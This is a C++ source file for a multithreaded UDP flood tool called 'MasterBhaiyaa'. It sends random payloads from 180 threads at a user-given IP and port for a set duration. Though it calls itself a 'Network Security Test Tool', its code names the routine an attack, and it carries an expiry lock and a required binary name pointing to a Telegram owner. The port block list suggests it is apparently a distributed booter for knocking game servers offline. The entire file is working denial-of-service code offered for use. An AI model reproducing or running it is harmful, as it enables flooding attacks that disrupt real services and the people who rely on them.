#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define DEFAULT_PAYLOAD_SIZE 20
#define FIXED_THREAD_COUNT 180  // Fixed number of threads
#define BINARY_NAME "MasterBhaiyaa"  // Required binary name

// Expiration Date
constexpr int EXPIRATION_YEAR = 2054;
constexpr int EXPIRATION_MONTH = 11;
constexpr int EXPIRATION_DAY = 1;

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int payload_size;
};

// Blocked Ports
bool is_blocked_port(int port) {
    return (port >= 100 && port <= 999) || (port == 17500) || (port >= 20000 && port <= 20002);
}

// Signal handler for stopping
void handle_signal(int) {
    std::cout << "\n[!] Interrupt received. Stopping attack...\n";
    stop_flag = true;
}

// Generate random payload
void generate_payload(std::string &buffer, size_t size) {
    static const char charset[] =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()";
    buffer.resize(size);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Check expiration date
void check_expiration() {
    std::tm expiration_date = {};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;

    std::time_t now = std::time(nullptr);
    if (std::difftime(now, std::mktime(&expiration_date)) > 0) {
        std::cerr << "╔════════════════════════════════════════╗\n";
        std::cerr << "║           BINARY EXPIRED!              ║\n";
        std::cerr << "║    Please contact the owner at:        ║\n";
        std::cerr << "║    Telegram: @MasterBhaiyaa            ║\n";
        std::cerr << "╚════════════════════════════════════════╝\n";
        exit(EXIT_FAILURE);
    }
}

// Check if the binary has been renamed
void check_binary_name() {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    
    if (len != -1) {
        exe_path[len] = '\0'; // Null-terminate the string
        std::string exe_name = std::string(exe_path);
        size_t pos = exe_name.find_last_of("/");

        if (pos != std::string::npos) {
            exe_name = exe_name.substr(pos + 1);
        }

        if (exe_name != BINARY_NAME) {
            std::cerr << "╔════════════════════════════════════════╗\n";
            std::cerr << "║         INVALID BINARY NAME!           ║\n";
            std::cerr << "║    Binary must be named 'MasterBhaiyaa'║\n";
            std::cerr << "╚════════════════════════════════════════╝\n";
            exit(EXIT_FAILURE);
        }
    }
}

// Validate IP Address
bool is_valid_ip(const std::string &ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// UDP packet sending function
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "[!] Socket creation failed\n";
        return;
    }

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(static_cast<uint16_t>(config.port));
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    sockaddr_in src_addr = {};
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);  // Use any available local address

    std::string payload;
    generate_payload(payload, config.payload_size);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        // Generate a random source port (1024-65535)
        uint16_t random_port = static_cast<uint16_t>((rand() % 64535) + 1024);
        src_addr.sin_port = htons(random_port);

        // Bind to random source port
        if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
            perror("[!] Bind failed");
            continue;
        }

        ssize_t sent = sendto(sock, payload.c_str(), payload.size(), 0,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent < 0) {
            perror("[!] Send failed");
            break;
        }
    }

    close(sock);
}

// Main function
int main(int argc, char *argv[]) {
    check_binary_name();
    check_expiration();

    std::cout << "╔════════════════════════════════════════╗\n";
    std::cout << "║          MasterBhaiyaa PROGRAM         ║\n";
    std::cout << "║         Copyright (c) 2024             ║\n";
    std::cout << "╚════════════════════════════════════════╝\n\n";

    if (argc < 4 || argc > 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [payload_size]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;

    if (!is_valid_ip(config.ip)) {
        std::cerr << "[!] Invalid IP address: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    if (is_blocked_port(config.port)) {
        std::cerr << "[!] Port " << config.port << " is blocked!\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "\n=====================================\n";
    std::cout << "      Network Security Test Tool     \n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Threads: " << FIXED_THREAD_COUNT << "\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < FIXED_THREAD_COUNT; ++i) {
        threads.emplace_back(udp_attack, config);
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Security test completed successfully.\n";

    return EXIT_SUCCESS;
}